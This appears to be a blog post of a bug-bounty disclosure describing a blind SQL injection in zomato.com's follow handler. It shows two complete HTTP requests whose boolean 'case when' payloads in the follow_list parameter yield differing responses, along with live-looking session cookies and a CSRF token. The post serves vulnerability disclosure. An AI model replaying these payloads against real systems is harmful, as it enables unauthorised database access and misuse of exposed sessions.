---
layout: post
title: www.zomato.com SQL Injection
categories: articles
---

<p align="right" class="date">{{ page.date | date_to_string }} - saltedfish</p>

## Steps To Reproduce:

Step 1: visit and login

Step 2:

{% highlight php %}
POST /php/common_follow_handler.php?type=follow_all HTTP/1.1
Host: www.zomato.com
Connection: close
Content-Length: 109
Accept: application/json, text/javascript, /; q=0.01
Origin: https://www.zomato.com
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Referer: https://www.zomato.com/
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: fbtrack=8a7f14c8b74958d3eaa88d1a45aca0fd; _ga=GA1.2.657534215.1529389361; dpr=1; cto_lwid=7ff8913d-c913-428f-bc62-2b2083f7450d; G_ENABLED_IDPS=google; __utmx=141625785.FQnzc5UZQdSMS6ggKyLrqQ$0:NaN; zhli=1; selectedDeliveryPlace=%7B%22entity_id%22%3A%223881%22%2C%22entity_type%22%3A%22DSZ%22%2C%22place_name%22%3A%22Dubai%20Knowledge%20Park%22%7D; feed_pref=city; SL_C_23361dd035530_KEY=05a4e27ac591b9ca633a4fe9b5fdc3875e22560f; zl=en; frcp_g=1; _gid=GA1.2.551947448.1535962312; al=1; orange=3247115; zone=7000; csrf=273022387c6fdb5b035790462cee2310; PHPSESSID=6314a14c38fd9f6ef8757102c6223db08fc4f1f2; squeeze=c9d44ea7f3a4e878d4f9bc0702a90e35; session_id=f53614924d964-b18a-4bcc-bb7b-918f7223963a; fbcity=6; ak_bmsc=622939D608DCC69BECCB32F4EB4922D1CB4A4306441F000052448E5B74DCC346~plgjmroXGsDV+cWwoWZmINEIZ9IUb6nQGZT/dzAAWOQYNy6nqrSxauuL2cd2Sax+Tb1VKyzeMDAA/PwJ4GCzzG6IrmYk7pqgFqZfR++ffCPgoAXauCju2ow4KsEo6NUzC9w+zJlddGcmSfYwtku5M4x6XzscOoEBFqCJ29/nQo8qaCwyNTUbDwVIxY4+N2Y8ETRdmdaV2/mDuYCMoRDo45M7rUpcPvo7wF9JJbKpUv/iI=; AMP_TOKEN=%24NOT_FOUND; LEL_JS=true; bm_sv=718E9125BCCC28798F841AE52ADAC741~aZPoyN9VGHc87X49I0AQJpvVlQVjR/b1xWSWdNxAYuUkjNAUKCM6IB9BClW9qggof43td/HTNmKWlgq8UQCRB/KxaMyj/fPoHzz2IGc8oCIzyS/K1WfF7s70YierHmrrz0xk/sxm1taCFz5ftMKYDJpJxZDvm04cyYHIkMAcqHc=; __utmxx=141625785.FQnzc5UZQdSMS6ggKyLrqQ$0:1536051775:8035200

follow_list=55175964/(case when(1=1) then 1 else 0 end)&type=USER&csrf_token=273022387c6fdb5b035790462cee2310


response {"status":"success"}
{% endhighlight %}


Step 3:

{% highlight php %}
POST /php/common_follow_handler.php?type=follow_all HTTP/1.1
Host: www.zomato.com
Connection: close
Content-Length: 109
Accept: application/json, text/javascript, /; q=0.01
Origin: https://www.zomato.com
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Referer: https://www.zomato.com/
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: fbtrack=8a7f14c8b74958d3eaa88d1a45aca0fd; _ga=GA1.2.657534215.1529389361; dpr=1; cto_lwid=7ff8913d-c913-428f-bc62-2b2083f7450d; G_ENABLED_IDPS=google; __utmx=141625785.FQnzc5UZQdSMS6ggKyLrqQ$0:NaN; zhli=1; selectedDeliveryPlace=%7B%22entity_id%22%3A%223881%22%2C%22entity_type%22%3A%22DSZ%22%2C%22place_name%22%3A%22Dubai%20Knowledge%20Park%22%7D; feed_pref=city; SL_C_23361dd035530_KEY=05a4e27ac591b9ca633a4fe9b5fdc3875e22560f; zl=en; frcp_g=1; _gid=GA1.2.551947448.1535962312; al=1; orange=3247115; zone=7000; csrf=273022387c6fdb5b035790462cee2310; PHPSESSID=6314a14c38fd9f6ef8757102c6223db08fc4f1f2; squeeze=c9d44ea7f3a4e878d4f9bc0702a90e35; session_id=f53614924d964-b18a-4bcc-bb7b-918f7223963a; fbcity=6; ak_bmsc=622939D608DCC69BECCB32F4EB4922D1CB4A4306441F000052448E5B74DCC346~plgjmroXGsDV+cWwoWZmINEIZ9IUb6nQGZT/dzAAWOQYNy6nqrSxauuL2cd2Sax+Tb1VKyzeMDAA/PwJ4GCzzG6IrmYk7pqgFqZfR++ffCPgoAXauCju2ow4KsEo6NUzC9w+zJlddGcmSfYwtku5M4x6XzscOoEBFqCJ29/nQo8qaCwyNTUbDwVIxY4+N2Y8ETRdmdaV2/mDuYCMoRDo45M7rUpcPvo7wF9JJbKpUv/iI=; AMP_TOKEN=%24NOT_FOUND; LEL_JS=true; bm_sv=718E9125BCCC28798F841AE52ADAC741~aZPoyN9VGHc87X49I0AQJpvVlQVjR/b1xWSWdNxAYuUkjNAUKCM6IB9BClW9qggof43td/HTNmKWlgq8UQCRB/KxaMyj/fPoHzz2IGc8oCIzyS/K1WfF7s70YierHmrrz0xk/sxm1taCFz5ftMKYDJpJxZDvm04cyYHIkMAcqHc=; __utmxx=141625785.FQnzc5UZQdSMS6ggKyLrqQ$0:1536051775:8035200

follow_list=55175964/(case when(1=2) then 1 else 0 end)&type=USER&csrf_token=273022387c6fdb5b035790462cee2310


response {"status":"failed"}
{% endhighlight %}

## Impact — SQL Injection

![图片1](https://i.imgur.com/MblmdRd.png)
![图片2](https://i.imgur.com/03zs7X3.png)

